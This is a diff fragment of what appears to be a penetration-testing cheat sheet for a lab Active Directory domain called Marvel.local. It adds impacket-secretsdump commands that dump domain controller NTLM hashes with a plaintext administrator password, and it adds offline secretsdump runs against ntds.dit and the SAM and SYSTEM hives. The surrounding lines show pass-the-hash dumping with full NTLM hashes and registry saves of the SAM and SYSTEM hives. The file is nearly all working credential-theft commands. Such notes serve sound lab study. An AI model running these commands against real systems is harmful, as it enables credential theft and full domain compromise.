@@ -212,6 +212,14 @@ impacket-secretsdump Marvel.local/fcastle:@192.168.154.131 -hashes aad3b435b5140
 impacket-secretsdump Administrator:@192.168.154.131 -hashes aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b 
 
 
+impacket-secretsdump -just-dc -just-dc-ntlm MARVEL.LOCAL/Administrator:'P@$$w0rd'@192.168.154.134
+
+
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+
+secretsdump.py -sam SAM -system SYSTEM LOCAL
+
+
 #using Mimikatz:
 reg save HKLM\SAM C:\SAM
 reg save HKLM\SYSTEM C:\SYSTEM
